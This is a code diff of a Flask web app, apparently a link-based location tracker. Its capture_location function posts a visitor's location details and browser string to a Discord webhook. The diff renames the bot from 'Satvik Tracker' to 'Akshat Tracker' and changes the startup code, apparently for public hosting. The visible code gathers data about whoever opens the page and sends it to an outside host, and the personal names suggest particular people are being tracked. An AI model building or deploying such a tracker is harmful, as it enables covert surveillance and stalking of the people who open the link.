@@ -33,11 +33,10 @@ def capture_location():
 **Browser:** {data.get('userAgent')}
 """
 
-    # Send to Discord
     try:
         payload = {
             "content": location_info,
-            "username": "Satvik Tracker",
+            "username": "Akshat Tracker",
             "avatar_url": "https://i.imgur.com/0jAV3.png"
         }
         requests.post(DISCORD_WEBHOOK_URL, json=payload)
@@ -52,6 +51,5 @@ def static_files(filename):
     return send_from_directory('static', filename)
 
 if __name__ == '__main__':
-    print("🚀 Server running at http://127.0.0.1:5000")
-    print("Open this link in browser to test")
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
